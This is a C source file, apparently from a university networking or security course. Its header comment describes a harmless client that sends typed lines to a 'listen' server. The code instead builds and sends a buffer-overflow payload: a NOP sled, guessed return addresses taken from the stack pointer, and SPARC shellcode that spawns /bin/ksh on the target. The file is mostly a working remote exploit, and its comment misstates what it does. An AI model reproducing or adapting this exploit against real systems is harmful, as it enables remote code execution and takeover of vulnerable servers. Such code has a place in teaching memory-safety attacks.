/******************************************************************************
 *
 *  File Name........: speak.cc
 *  Usage: speak <listen-machine-name> <listen-machine-port-number>
 *  Example: login net03.utdallas.edu, and type
 *           speak net01 7000    --- speak to the machine listen is running
 *           Type "<cntl>-D" to exit
 *
 *  Description......:
 *	Create a process that speaks to the listen.cc program.  After 
 *  connecting, each line of input is sent to listen.
 *
 *  This program takes two arguments.  The first is the host name on which
 *  the listen process is running. (Note: listen must be started first.)
 *  The second is the port number on which listen is accepting connections.
 *****************************************************************************/

/*........................ Include Files ....................................*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>
//#include "/afs/nd.edu/sun4x_55/opt/SUNWspro/SC4.2/include/CC/sysent.h"

#define MAXL 512  // max string length
#define DEFAULT_BSIZE 300
#define DEFAULT_OFFSET 1200

char nop_[]="\xac\x15\xa1\x6e";
char shellcode[]=         /* 10*4+8 bytes */ "\x20\xbf\xff\xff"   /* bn,a  */ "\x20\xbf\xff\xff"   /* bn,a  */ "\x7f\xff\xff\xff"   /* call  */ "\x90\x03\xe0\x20"   /* add %o7,32,%o0 */ "\x92\x02\x20\x10"   /* add %o0,16,%o1 */ "\xc0\x22\x20\x08"   /* st %g0,[%o0+8] */ "\xd0\x22\x20\x10"   /* st %o0,[%o0+16] */ "\xc0\x22\x20\x14"   /* st %g0,[%o0+20] */ "\x82\x10\x20\x0b"   /* mov 0x0b,%g1 */ "\x91\xd0\x20\x08"   /* ta 8 */ "/bin/ksh" ;
unsigned long get_sp(void) {
  __asm__("or %sp, %sp, %i0");
}

int main (int argc, void *argv[])
{
  int s,port,bsize,offset;
  char host[64];
  struct hostent *hp;  
  struct sockaddr_in sin;  
  
  int result, len;
  char str[MAXL],buf[MAXL];
  
  /* read host and port number from command line */
  if ( argc < 3 ) 
  { fprintf(stderr, 
     "Usage: %s <listen-machine-name> <port-number> [<buffer size> [<offset>]]\n", argv[0]);
    exit(1);
  }
  if (argc>3)
    bsize = atoi(argv[3]);
  else
    bsize = DEFAULT_BSIZE;
  if (argc>4)
    offset = atoi(argv[4]);
  else
    offset = DEFAULT_OFFSET;

  /* fill in hostent struct */
  hp = gethostbyname((char*)argv[1]); 
  if ( hp == NULL ) 
  { fprintf(stderr, "%s: host not found (%s)\n", argv[0], host);
    exit(1);
  }
  port = atoi((char*)argv[2]);

  /***************************************************
     open a socket for connecting
     4 steps:
   	1. create socket
   	2. set up the address and port
	3. connect to the accepting socket
           to get a connection
  *****************************************************/

  /* create a socket:
     use address family INET and STREAMing sockets (TCP) */
  s = socket(AF_INET, SOCK_STREAM, 0);
  if ( s < 0 ) 
  { perror("socket:");
    exit(s);
  }

  /* set up the address and port */
  sin.sin_family = AF_INET;
  sin.sin_port = htons(port);
  memcpy(&sin.sin_addr, hp->h_addr_list[0], hp->h_length);
  
  /* connect to socket at above addr and port */
  result = connect(s, (struct sockaddr *)&sin, sizeof(sin));
  if ( result < 0 ) 
    { perror("connect:");
      exit(result);
    }

  printf(">> Connection established.\n");
  /* read a string from the terminal and send on socket */
  char* bof = calloc(bsize+1, 1);
  long* addr_ptr = (long *) bof;
  //long addr = 0xffbfebb8 - offset;
  long addr = get_sp() - offset;
  printf("Using address %x\n", addr);

  for (int i = 0; i < bsize; i+=4)
    *(addr_ptr++) = addr;
  for (int i = 0; i < bsize / 2; i+=4){
    bof[i] = nop_[0];
    bof[i+1] = nop_[1];
    bof[i+2] = nop_[2];
    bof[i+3] = nop_[3];
  }
  int start = bsize/2;
  start -= start%4;
  memcpy(&(bof[start]), shellcode, strlen(shellcode));

  len = send(s, bof, bsize+1, 0);
  if ( len != bsize+1 ) 
  { 
    perror("send");
    exit(1);
  }
  
  close(s);
  exit(0);
}

